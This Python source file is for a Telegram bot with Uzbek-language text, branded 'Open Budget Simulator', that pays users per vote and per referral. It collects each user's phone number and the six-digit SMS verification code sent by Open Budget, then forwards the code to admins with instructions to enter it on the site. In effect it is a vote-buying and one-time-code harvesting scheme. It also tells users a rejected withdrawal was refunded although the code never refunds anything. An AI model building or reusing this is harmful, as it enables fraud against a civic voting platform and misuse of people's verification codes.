import telebot
from telebot import types
import config
from database import Database

# Initialize bot and database
bot = telebot.TeleBot(config.BOT_TOKEN)
db = Database()

# Memory storage for user states
user_states = {}

def get_state(user_id):
    return user_states.get(user_id, {}).get("state")

def get_state_data(user_id):
    return user_states.get(user_id, {}).get("data", {})

def set_state(user_id, state, data=None):
    if data is None:
        data = {}
    user_states[user_id] = {"state": state, "data": data}

def clear_state(user_id):
    user_states.pop(user_id, None)

def is_admin(user_id):
    return db.is_admin(user_id)

# Helper function to generate main menu keyboard
def main_menu_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🗳️ Ovoz berish", "👤 Kabinet")
    markup.row("🔗 Takliflar", "💰 Pul yechish")
    markup.row("🏆 Top Reyting", "ℹ️ Ma'lumot")
    return markup

# Helper function to generate admin menu keyboard
def admin_menu_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📊 Statistika", "⚙️ Sozlamalar")
    markup.row("🗳️ Kutilayotgan Ovozlar", "💰 Yechish So'rovlari")
    markup.row("📢 Xabar yuborish", "🚪 Chiqish")
    return markup

# --- USER COMMANDS ---

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Check referral
    referred_by = None
    args = message.text.split()
    if len(args) > 1:
        referred_by = args[1]
        try:
            referred_by = int(referred_by)
        except ValueError:
            referred_by = None

    # Add user to database
    db.add_user(user_id, username, first_name, referred_by)
    clear_state(user_id)

    # Auto-admin assignment for testing if no admins exist
    current_admins = db.get_admins()
    is_now_admin = False
    if len(current_admins) == 0:
        db.add_admin(user_id)
        is_now_admin = True

    # Welcome message
    welcome_text = (
        f"Assalomu alaykum, {first_name}!\n\n"
        f"**Open Budget Simulator** botiga xush kelibsiz.\n"
        f"Bu yerda siz veb-sayt yoki bot orqali ovoz berib pul ishlashingiz mumkin.\n\n"
        f"🔗 Bizning test saytimiz: {db.get_setting('project_url', config.DEFAULT_PROJECT_URL)}\n\n"
        f"Boshlash uchun quyidagi menyudan foydalaning👇"
    )
    
    if is_now_admin:
        welcome_text += "\n\n👑 **Siz botning birinchi foydalanuvchisi bo'lganingiz uchun avtomatik tarzda ADMIN bo'ldingiz!** Admin paneliga o'tish uchun /admin komandasini bosing."
        
    bot.send_message(user_id, welcome_text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.send_message(user_id, "❌ Siz admin emassiz.")
        return
        
    bot.send_message(
        user_id, 
        "⚙️ Admin paneliga xush kelibsiz. Kerakli bo'limni tanlang:", 
        reply_markup=admin_menu_keyboard()
    )

# --- USER ACTIONS ---

@bot.message_handler(func=lambda msg: msg.text == "🗳️ Ovoz berish")
def user_vote(message):
    user_id = message.from_user.id
    
    # Check if bot is active
    if db.get_setting("is_bot_active") != "True":
        bot.send_message(user_id, "⚠️ Hozirda bot vaqtincha to'xtatilgan. Ovoz berish qabul qilinmaydi.")
        return

    # Check if user has active vote pending
    if db.check_active_vote_exists(user_id):
        bot.send_message(user_id, "⚠️ Sizda faol ovoz berish so'rovi bor. Iltimos, uni yakunlang yoki admin tasdiqlashini kuting.")
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button_phone = types.KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)
    markup.add(button_phone)
    markup.add(types.KeyboardButton("❌ Bekor qilish"))

    set_state(user_id, "waiting_for_phone")
    
    project_url = db.get_setting("project_url", config.DEFAULT_PROJECT_URL)
    vote_reward = db.get_setting("vote_reward", str(config.VOTE_REWARD))
    
    instruction = (
        f"🗳️ **Ovoz berish bo'limi**\n\n"
        f"Siz bot orqali yoki veb-saytda ovoz berishingiz mumkin.\n"
        f"🔗 Sayt orqali ovoz berish: [Sayt havolasi]({project_url})\n\n"
        f"Ovoz tasdiqlangach sizga **{vote_reward} so'm** beriladi.\n\n"
        f"**Bot orqali** ovoz berishni boshlash uchun quyidagi **'📱 Telefon raqamni yuborish'** tugmasini bosing yoki telefon raqamingizni `+998XXXXXXXXX` formatida yozib yuboring:"
    )
    bot.send_message(user_id, instruction, reply_markup=markup, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(func=lambda msg: msg.text == "👤 Kabinet")
def user_cabinet(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    if not user:
        return
    
    successful_votes = db.get_user_successful_votes_count(user_id)
    ref_count = db.get_referral_count(user_id)
    phone_str = user['phone_number'] if user['phone_number'] else "Kiritilmagan"
    
    cabinet_text = (
        f"👤 **Sizning hisobingiz**\n\n"
        f"🆔 ID: `{user['user_id']}`\n"
        f"🏷️ Ism: {user['first_name']}\n"
        f"📱 Ulangan telefon: `{phone_str}`\n"
        f"💵 Balans: **{user['balance']} so'm**\n\n"
        f"🗳️ Muvaffaqiyatli ovozlaringiz: {successful_votes} ta\n"
        f"👥 Taklif qilgan do'stlaringiz: {ref_count} ta"
    )
    bot.send_message(user_id, cabinet_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "🔗 Takliflar")
def user_referrals(message):
    user_id = message.from_user.id
    bot_info = bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    ref_reward = db.get_setting("referral_reward", str(config.REFERRAL_REWARD))
    
    ref_text = (
        f"🔗 **Takliflar tizimi**\n\n"
        f"Do'stlaringizni botga taklif qiling. Ular bot yoki sayt orqali ovoz berib, ovozi tasdiqlangandan so'ng, sizga **{ref_reward} so'm** bonus beriladi!\n\n"
        f"Sizning referal havolangiz:\n`{ref_link}`\n\n"
        f"Havolani nusxalab, do'stlaringizga yuboring!"
    )
    bot.send_message(user_id, ref_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "💰 Pul yechish")
def user_withdraw(message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    min_withdraw = int(db.get_setting("min_withdraw", str(config.MIN_WITHDRAW)))
    
    if user['balance'] < min_withdraw:
        bot.send_message(
            user_id, 
            f"❌ Balansingiz yetarli emas.\n"
            f"Minimal yechib olish miqdori: **{min_withdraw} so'm**\n"
            f"Sizning balansingiz: **{user['balance']} so'm**", 
            parse_mode="Markdown"
        )
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("❌ Bekor qilish"))
    
    set_state(user_id, "waiting_for_card")
    bot.send_message(
        user_id,
        "💳 Pul o'tkaziladigan karta raqami va karta egasining ismini kiriting:\n\n"
        "Masalan: `8600123456789012 Eshmatov Toshmat`",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda msg: msg.text == "ℹ️ Ma'lumot")
def user_info(message):
    user_id = message.from_user.id
    project_url = db.get_setting("project_url", config.DEFAULT_PROJECT_URL)
    vote_reward = db.get_setting("vote_reward", str(config.VOTE_REWARD))
    ref_reward = db.get_setting("referral_reward", str(config.REFERRAL_REWARD))
    min_withdraw = db.get_setting("min_withdraw", str(config.MIN_WITHDRAW))

    info_text = (
        f"ℹ️ **Loyiha haqida ma'lumot**\n\n"
        f"Bu o'quv-test loyihasi bo'lib, **Open Budget** saytlari va Telegram botlari qanday ishlashini ko'rsatadi.\n\n"
        f"💵 **Tariflar:**\n"
        f"• Har bir ovoz uchun: **{vote_reward} so'm**\n"
        f"• Har bir taklif (referal) uchun: **{ref_reward} so'm**\n"
        f"• Minimal pul yechish: **{min_withdraw} so'm**\n\n"
        f"🗳️ **Ovoz berish usullari:**\n"
        f"1. Veb-saytga kiring va telefon raqamingizni yozing.\n"
        f"2. Agar shu telefon raqamingiz Telegram botga ulangan bo'lsa, bot sizga tasdiqlash kodini yuboradi. Agar ulanmagan bo'lsa, kod bot adminlariga boradi.\n"
        f"3. Kodni saytga kiriting va ovozni tasdiqlang.\n\n"
        f"🔗 Veb-sayt: {project_url}"
    )
    bot.send_message(user_id, info_text, parse_mode="Markdown", disable_web_page_preview=True)

@bot.message_handler(func=lambda msg: msg.text == "🏆 Top Reyting")
def user_leaderboard(message):
    user_id = message.from_user.id
    
    top_voters = db.get_top_voters(10)
    top_referrers = db.get_top_referrers(10)
    
    text = "🏆 **Open Budget Simulator Reytingi**\n\n"
    
    text += "🗳️ **Eng ko'p ovoz berganlar (Top 10):**\n"
    if not top_voters:
        text += "  _Hozircha ma'lumot yo'q_\n"
    for i, v in enumerate(top_voters, 1):
        user_str = f"@{v['username']}" if v['username'] != "Yashirin" else v['first_name']
        text += f"{i}. {user_str} — **{v['vote_count']} ta** ovoz\n"
        
    text += "\n👥 **Eng ko'p do'st taklif qilganlar (Top 10):**\n"
    if not top_referrers:
        text += "  _Hozircha ma'lumot yo'q_\n"
    for i, r in enumerate(top_referrers, 1):
        user_str = f"@{r['username']}" if r['username'] != "Yashirin" else r['first_name']
        text += f"{i}. {user_str} — **{r['ref_count']} ta** do'st\n"
        
    bot.send_message(user_id, text, parse_mode="Markdown")

# --- STATE HANDLERS ---

@bot.message_handler(func=lambda msg: True, content_types=['text', 'contact'])
def handle_states(message):
    user_id = message.from_user.id
    state = get_state(user_id)

    if not state:
        if is_admin(user_id):
            handle_admin_messages(message)
        return

    # Global cancel action
    if message.text == "❌ Bekor qilish":
        clear_state(user_id)
        bot.send_message(user_id, "Jarayon bekor qilindi.", reply_markup=main_menu_keyboard())
        return

    if state == "waiting_for_phone":
        phone = None
        if message.content_type == 'contact' and message.contact:
            phone = message.contact.phone_number
        elif message.text:
            phone = message.text.strip()
        
        if not phone:
            bot.send_message(user_id, "⚠️ Iltimos, telefon raqamingizni yuboring.")
            return

        # Clean phone number format
        phone = phone.replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            if phone.startswith("998"):
                phone = "+" + phone
            elif len(phone) == 9 and phone.isdigit():
                phone = "+998" + phone
            else:
                bot.send_message(user_id, "⚠️ Telefon raqam noto'g'ri shaklda. Iltimos, qaytadan yuboring (Masalan: +998901234567).")
                return

        # Check format validation
        if not (phone.startswith("+998") and len(phone) == 13 and phone[1:].isdigit()):
            bot.send_message(user_id, "⚠️ Faqat O'zbekiston raqamlari qabul qilinadi (+998XXXXXXXXX). Qaytadan urinib ko'ring.")
            return

        # Check if already voted successfully
        if db.check_phone_voted_already(phone):
            bot.send_message(user_id, "❌ Bu telefon raqam orqali avvalroq ovoz berilgan. Boshqa raqamdan foydalaning.")
            clear_state(user_id)
            return

        # Update user profile's phone number
        db.update_user_phone(user_id, phone)

        # Add vote to DB in pending_phone status
        vote_id = db.add_vote(user_id, phone)
        
        # Advance state to waiting for SMS
        set_state(user_id, "waiting_for_sms", {"vote_id": vote_id, "phone": phone})

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("❌ Bekor qilish"))
        
        bot.send_message(
            user_id,
            f"✅ Telefon raqamingiz ({phone}) qabul qilindi va Telegram profilingizga ulandi!\n\n"
            f"Tez orada ushbu raqamga **openbudget**dan 6 ta raqamli tasdiqlash kodi yuboriladi.\n"
            f"Kodni olganingizdan so'ng, uni botga yozib yuboring:",
            reply_markup=markup
        )
        
        # Notify admins about phone number
        notify_admins_new_phone(vote_id, user_id, message.from_user.first_name, phone)

    elif state == "waiting_for_sms":
        sms_code = message.text
        if not sms_code or not sms_code.strip().isdigit():
            bot.send_message(user_id, "⚠️ SMS kod faqat raqamlardan iborat bo'lishi kerak. Iltimos, qaytadan yuboring:")
            return
            
        data = get_state_data(user_id)
        vote_id = data.get("vote_id")
        phone = data.get("phone")
        
        # Update vote status and save SMS code
        db.update_vote_sms(vote_id, sms_code)
        clear_state(user_id)
        
        bot.send_message(
            user_id,
            "✅ SMS kod qabul qilindi va tekshirishga yuborildi!\n"
            "Admin ovozni tasdiqlashi bilan hisobingizga pul o'tkaziladi. Bu bir necha daqiqa olishi mumkin.",
            reply_markup=main_menu_keyboard()
        )
        
        # Notify admins about SMS code
        notify_admins_sms_code(vote_id, user_id, message.from_user.first_name, phone, sms_code)

    elif state == "waiting_for_card":
        card_details = message.text
        if not card_details or len(card_details.strip()) < 16:
            bot.send_message(user_id, "⚠️ Karta raqami noto'g'ri kiritilgan ko'rinadi. Iltimos, to'liq va to'g'ri kiriting:")
            return
            
        # Store card details and ask for amount
        set_state(user_id, "waiting_for_amount", {"card": card_details})
        user = db.get_user(user_id)
        
        bot.send_message(
            user_id,
            f"💵 Qancha pul yechmoqchisiz?\n"
            f"Sizning balansingiz: **{user['balance']} so'm**\n"
            f"Yechib olmoqchi bo'lgan miqdoringizni faqat raqamlarda yozing:"
        )

    elif state == "waiting_for_amount":
        amount_text = message.text
        if not amount_text or not amount_text.strip().isdigit():
            bot.send_message(user_id, "⚠️ Iltimos, miqdorni faqat butun raqamlarda kiriting:")
            return
            
        amount = int(amount_text)
        user = db.get_user(user_id)
        min_withdraw = int(db.get_setting("min_withdraw", str(config.MIN_WITHDRAW)))
        data = get_state_data(user_id)
        card = data.get("card")
        
        if amount > user['balance']:
            bot.send_message(user_id, f"❌ Hisobingizda mablag' yetarli emas. Balansingiz: {user['balance']} so'm. Qayta urinib ko'ring:")
            return
            
        if amount < min_withdraw:
            bot.send_message(user_id, f"❌ Minimal yechish miqdori {min_withdraw} so'm. Boshqa miqdor kiriting:")
            return
            
        # Register withdrawal request
        withdraw_id = db.add_withdrawal(user_id, card, amount)
        clear_state(user_id)
        
        bot.send_message(
            user_id,
            f"✅ Pul yechish so'rovingiz qabul qilindi!\n"
            f"Mablag': **{amount} so'm**\n"
            f"Karta: `{card}`\n"
            f"Tez orada operator pullarni kartangizga o'tkazib beradi.",
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )
        
        # Notify Admins
        notify_admins_withdrawal(withdraw_id, user_id, message.from_user.first_name, card, amount)

    # --- ADMIN STATES ---
    elif state == "admin_setting_project_url" and is_admin(user_id):
        url = message.text.strip()
        db.set_setting("project_url", url)
        clear_state(user_id)
        bot.send_message(user_id, f"✅ Loyiha havolasi muvaffaqiyatli o'zgartirildi:\n{url}", reply_markup=admin_menu_keyboard())

    elif state == "admin_setting_vote_reward" and is_admin(user_id):
        val = message.text.strip()
        if not val.isdigit():
            bot.send_message(user_id, "⚠️ Faqat raqam kiriting:")
            return
        db.set_setting("vote_reward", val)
        clear_state(user_id)
        bot.send_message(user_id, f"✅ Ovoz berish uchun mukofot {val} so'm qilib belgilandi.", reply_markup=admin_menu_keyboard())

    elif state == "admin_setting_ref_reward" and is_admin(user_id):
        val = message.text.strip()
        if not val.isdigit():
            bot.send_message(user_id, "⚠️ Faqat raqam kiriting:")
            return
        db.set_setting("referral_reward", val)
        clear_state(user_id)
        bot.send_message(user_id, f"✅ Taklif (referal) uchun mukofot {val} so'm qilib belgilandi.", reply_markup=admin_menu_keyboard())

    elif state == "admin_setting_min_withdraw" and is_admin(user_id):
        val = message.text.strip()
        if not val.isdigit():
            bot.send_message(user_id, "⚠️ Faqat raqam kiriting:")
            return
        db.set_setting("min_withdraw", val)
        clear_state(user_id)
        bot.send_message(user_id, f"✅ Minimal yechib olish miqdori {val} so'm qilib belgilandi.", reply_markup=admin_menu_keyboard())

    elif state == "admin_broadcasting" and is_admin(user_id):
        text = message.text
        clear_state(user_id)
        bot.send_message(user_id, "📢 Xabarni barcha foydalanuvchilarga tarqatish boshlandi...", reply_markup=admin_menu_keyboard())
        
        users = db.get_all_users_list()
        success = 0
        failed = 0
        for uid in users:
            try:
                bot.send_message(uid, text)
                success += 1
            except Exception:
                failed += 1
                
        bot.send_message(user_id, f"📢 Tarqatish yakunlandi.\n✅ Yetkazildi: {success} ta foydalanuvchiga\n❌ Yetkazilmadi: {failed} ta foydalanuvchiga")

# --- ADMIN FUNCTIONS ---

def handle_admin_messages(message):
    user_id = message.from_user.id
    text = message.text

    if text == "📊 Statistika":
        stats = db.get_stats()
        stats_text = (
            f"📊 **Bot Statistikasi:**\n\n"
            f"👥 Jami a'zolar: {stats['total_users']} ta\n"
            f"✅ Tasdiqlangan ovozlar: {stats['approved_votes']} ta\n"
            f"⏳ Kutilayotgan ovozlar: {stats['pending_votes']} ta\n\n"
            f"💰 To'lab berilgan pul: {stats['total_withdrawn']} so'm\n"
            f"⏳ To'lov kutilayotgan pul: {stats['pending_withdrawn']} so'm"
        )
        bot.send_message(user_id, stats_text, parse_mode="Markdown")

    elif text == "⚙️ Sozlamalar":
        url = db.get_setting("project_url", config.DEFAULT_PROJECT_URL)
        vote_reward = db.get_setting("vote_reward", str(config.VOTE_REWARD))
        ref_reward = db.get_setting("referral_reward", str(config.REFERRAL_REWARD))
        min_withdraw = db.get_setting("min_withdraw", str(config.MIN_WITHDRAW))
        is_active = db.get_setting("is_bot_active", "True")
        
        status_str = "🟢 Faol" if is_active == "True" else "🔴 To'xtatilgan"

        settings_text = (
            f"⚙️ **Tizim Sozlamalari:**\n\n"
            f"🔗 Loyiha URL: {url}\n"
            f"💵 Ovoz haqi: {vote_reward} so'm\n"
            f"👥 Referal bonus: {ref_reward} so'm\n"
            f"💰 Minimal yechish: {min_withdraw} so'm\n"
            f"🤖 Bot holati: {status_str}"
        )
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🔗 Loyiha havolasini o'zgartirish", callback_data="admin_set_url"),
            types.InlineKeyboardButton("💵 Ovoz to'lovini o'zgartirish", callback_data="admin_set_vote"),
            types.InlineKeyboardButton("👥 Referal bonusni o'zgartirish", callback_data="admin_set_ref"),
            types.InlineKeyboardButton("💰 Minimal yechishni o'zgartirish", callback_data="admin_set_min"),
            types.InlineKeyboardButton("🤖 Botni Yoqish / O'chirish", callback_data="admin_toggle_bot")
        )
        bot.send_message(user_id, settings_text, reply_markup=markup)

    elif text == "🗳️ Kutilayotgan Ovozlar":
        votes = db.get_pending_votes()
        if not votes:
            bot.send_message(user_id, "⏳ Hozirda kutilayotgan ovozlar yo'q.")
            return
            
        bot.send_message(user_id, f"⏳ Kutilayotgan jami ovozlar: {len(votes)} ta. Ro'yxat quyida:")
        
        for vote in votes[:10]:
            sms_str = vote['sms_code'] if vote['sms_code'] else "Kutilmoqda..."
            status_emoji = "🔑" if vote['status'] == "pending_sms" else "📱"
            
            v_text = (
                f"🗳️ **Ovoz #{vote['id']}**\n"
                f"👤 User ID: `{vote['user_id']}`\n"
                f"📱 Telefon: `{vote['phone_number']}`\n"
                f"{status_emoji} SMS kod: `{sms_str}`\n"
                f"⏰ Yaratilgan vaqt: {vote['created_at']}"
            )
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_vote_{vote['id']}"),
                types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_vote_{vote['id']}")
            )
            bot.send_message(user_id, v_text, reply_markup=markup, parse_mode="Markdown")

    elif text == "💰 Yechish So'rovlari":
        withdrawals = db.get_pending_withdrawals()
        if not withdrawals:
            bot.send_message(user_id, "💰 Hozircha pul yechish so'rovlari mavjud emas.")
            return
            
        bot.send_message(user_id, f"💰 Kutilayotgan jami so'rovlar: {len(withdrawals)} ta:")
        
        for w in withdrawals[:10]:
            w_text = (
                f"💰 **Pul yechish #{w['id']}**\n"
                f"👤 User ID: `{w['user_id']}`\n"
                f"💳 Karta: `{w['card_number']}`\n"
                f"💵 Miqdor: **{w['amount']} so'm**\n"
                f"⏰ Vaqt: {w['created_at']}"
            )
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("✅ To'landi", callback_data=f"approve_withdraw_{w['id']}"),
                types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_withdraw_{w['id']}")
            )
            bot.send_message(user_id, w_text, reply_markup=markup, parse_mode="Markdown")

    elif text == "📢 Xabar yuborish":
        set_state(user_id, "admin_broadcasting")
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(types.KeyboardButton("❌ Bekor qilish"))
        bot.send_message(user_id, "📢 Foydalanuvchilarga yubormoqchi bo'lgan xabaringiz matnini kiriting:", reply_markup=markup)

    elif text == "🚪 Chiqish":
        bot.send_message(user_id, "Foydalanuvchi menyusi.", reply_markup=main_menu_keyboard())

# --- ADMIN NOTIFICATION FUNCTIONS ---

def notify_admins_new_phone(vote_id, user_id, first_name, phone):
    message_text = (
        f"🔔 **Yangi Ovoz Berish (#Phone)**\n\n"
        f"🆔 ID: `{vote_id}`\n"
        f"👤 Foydalanuvchi: {first_name} (ID: `{user_id}`)\n"
        f"📱 Telefon: `{phone}`\n\n"
        f"Foydalanuvchi hozir SMS kodni kiritishi kutilmoqda..."
    )
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("❌ Rad etish (Bekor qilish)", callback_data=f"reject_vote_{vote_id}"))
    
    admins = db.get_admins()
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message_text, reply_markup=markup, parse_mode="Markdown")
        except Exception:
            pass

def notify_admins_sms_code(vote_id, user_id, first_name, phone, sms_code):
    message_text = (
        f"🗳️ **SMS kod keldi (Ovoz #{vote_id})**\n\n"
        f"👤 Foydalanuvchi: {first_name} (ID: `{user_id}`)\n"
        f"📱 Telefon: `{phone}`\n"
        f"🔑 SMS kod: `{sms_code}`\n\n"
        f"Iltimos, kodni saytga kiriting va tasdiqlang."
    )
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ Ovoz o'tdi", callback_data=f"approve_vote_{vote_id}"),
        types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_vote_{vote_id}")
    )
    
    admins = db.get_admins()
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message_text, reply_markup=markup, parse_mode="Markdown")
        except Exception:
            pass

def notify_admins_withdrawal(withdraw_id, user_id, first_name, card, amount):
    message_text = (
        f"💰 **Pul yechish so'rovi #{withdraw_id}**\n\n"
        f"👤 Foydalanuvchi: {first_name} (ID: `{user_id}`)\n"
        f"💳 Karta: `{card}`\n"
        f"💵 Miqdor: **{amount} so'm**\n\n"
        f"Karta hisobiga pul o'tkazing va tasdiqlang."
    )
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ To'landi", callback_data=f"approve_withdraw_{withdraw_id}"),
        types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_withdraw_{withdraw_id}")
    )
    
    admins = db.get_admins()
    for admin_id in admins:
        try:
            bot.send_message(admin_id, message_text, reply_markup=markup, parse_mode="Markdown")
        except Exception:
            pass

# --- CALLBACK QUERY HANDLERS ---

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = call.from_user.id
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ Siz admin emassiz.")
        return

    data = call.data

    # --- Vote Callbacks ---
    if data.startswith("approve_vote_"):
        vote_id = int(data.split("_")[2])
        vote = db.get_vote(vote_id)
        
        if not vote or vote['status'] in ('approved', 'rejected'):
            bot.answer_callback_query(call.id, "⚠️ Bu ovoz allaqachon tasdiqlangan yoki rad etilgan.")
            return
            
        # Update status
        db.update_vote_status(vote_id, "approved")
        
        # Rewards
        vote_reward = int(db.get_setting("vote_reward", str(config.VOTE_REWARD)))
        ref_reward = int(db.get_setting("referral_reward", str(config.REFERRAL_REWARD)))
        
        # Add reward to voting user
        if vote['user_id']:
            db.update_balance(vote['user_id'], vote_reward)
            try:
                bot.send_message(
                    vote['user_id'], 
                    f"🎉 Tabriklaymiz! Siz yuborgan `{vote['phone_number']}` raqamidagi ovoz tasdiqlandi.\n"
                    f"Balansingizga **{vote_reward} so'm** qo'shildi!",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
                
            # Check and reward referrer
            user_info = db.get_user(vote['user_id'])
            if user_info and user_info['referred_by']:
                referrer_id = user_info['referred_by']
                db.update_balance(referrer_id, ref_reward)
                try:
                    bot.send_message(
                        referrer_id,
                        f"👥 Siz taklif qilgan {user_info['first_name']} muvaffaqiyatli ovoz berdi.\n"
                        f"Sizga **{ref_reward} so'm** referal bonus berildi!",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
                
        bot.answer_callback_query(call.id, "✅ Ovoz tasdiqlandi!")
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=call.message.text + f"\n\n✅ **Tasdiqlandi (Admin ID: {user_id})**",
            parse_mode="Markdown"
        )

    elif data.startswith("reject_vote_"):
        vote_id = int(data.split("_")[2])
        vote = db.get_vote(vote_id)
        
        if not vote or vote['status'] in ('approved', 'rejected'):
            bot.answer_callback_query(call.id, "⚠️ Bu ovoz allaqachon tasdiqlangan yoki rad etilgan.")
            return
            
        db.update_vote_status(vote_id, "rejected")
        
        if vote['user_id']:
            try:
                bot.send_message(
                    vote['user_id'], 
                    f"❌ Siz yuborgan `{vote['phone_number']}` raqamidagi ovoz rad etildi.\n"
                    f"Sababi: Ovoz rasmiy saytdan o'tmadi yoki noto'g'ri kod yuborildi.",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            
        bot.answer_callback_query(call.id, "❌ Ovoz rad etildi.")
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=call.message.text + f"\n\n❌ **Rad etildi (Admin ID: {user_id})**",
            parse_mode="Markdown"
        )

    # --- Withdrawal Callbacks ---
    elif data.startswith("approve_withdraw_"):
        withdraw_id = int(data.split("_")[2])
        w = db.get_withdrawal(withdraw_id)
        
        if not w or w['status'] in ('approved', 'rejected'):
            bot.answer_callback_query(call.id, "⚠️ Bu so'rov allaqachon bajarilgan.")
            return
            
        db.update_withdrawal_status(withdraw_id, "approved")
        
        try:
            bot.send_message(
                w['user_id'],
                f"✅ **Pul yechish tasdiqlandi!**\n"
                f"Karta: `{w['card_number']}`\n"
                f"Miqdor: **{w['amount']} so'm**\n"
                f"Pullar kartangizga to'liq o'tkazib berildi.",
                parse_mode="Markdown"
            )
        except Exception:
            pass
            
        bot.answer_callback_query(call.id, "✅ To'lov tasdiqlandi!")
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=call.message.text + f"\n\n✅ **To'lab berildi (Admin ID: {user_id})**",
            parse_mode="Markdown"
        )

    elif data.startswith("reject_withdraw_"):
        withdraw_id = int(data.split("_")[2])
        w = db.get_withdrawal(withdraw_id)
        
        if not w or w['status'] in ('approved', 'rejected'):
            bot.answer_callback_query(call.id, "⚠️ Bu so'rov allaqachon bajarilgan.")
            return
            
        db.update_withdrawal_status(withdraw_id, "rejected")
        
        try:
            bot.send_message(
                w['user_id'],
                f"❌ **Pul yechish rad etildi!**\n"
                f"Miqdor: **{w['amount']} so'm**\n"
                f"Mablag' qayta balansingizga qaytarildi. Karta ma'lumotlarini tekshiring.",
                parse_mode="Markdown"
            )
        except Exception:
            pass
            
        bot.answer_callback_query(call.id, "❌ Pul yechish rad etildi, pul qaytarildi.")
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=call.message.text + f"\n\n❌ **Rad etildi (Mablag' qaytarildi) (Admin ID: {user_id})**",
            parse_mode="Markdown"
        )

    # --- Setting Callbacks ---
    elif data == "admin_set_url":
        set_state(user_id, "admin_setting_project_url")
        bot.send_message(user_id, "🔗 Yangi loyiha havolasini (URL) yuboring:")
        bot.answer_callback_query(call.id)

    elif data == "admin_set_vote":
        set_state(user_id, "admin_setting_vote_reward")
        bot.send_message(user_id, "💵 Bitta tasdiqlangan ovoz uchun to'lov miqdorini kiriting (UZS da, faqat raqam):")
        bot.answer_callback_query(call.id)

    elif data == "admin_set_ref":
        set_state(user_id, "admin_setting_ref_reward")
        bot.send_message(user_id, "👥 Referal taklif qilganligi uchun bonus miqdorini kiriting (UZS da, faqat raqam):")
        bot.answer_callback_query(call.id)

    elif data == "admin_set_min":
        set_state(user_id, "admin_setting_min_withdraw")
        bot.send_message(user_id, "💰 Minimal pul yechish miqdorini kiriting (UZS da, faqat raqam):")
        bot.answer_callback_query(call.id)

    elif data == "admin_toggle_bot":
        is_active = db.get_setting("is_bot_active", "True")
        new_val = "False" if is_active == "True" else "True"
        db.set_setting("is_bot_active", new_val)
        
        status_str = "🟢 Faol" if new_val == "True" else "🔴 To'xtatilgan"
        bot.send_message(user_id, f"🤖 Bot holati o'zgartirildi: {status_str}")
        bot.answer_callback_query(call.id, f"Bot holati: {status_str}")

# --- START BOT ---
if __name__ == '__main__':
    print("Open Budget Simulator bot ishga tushmoqda...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Xatolik yuz berdi: {e}")
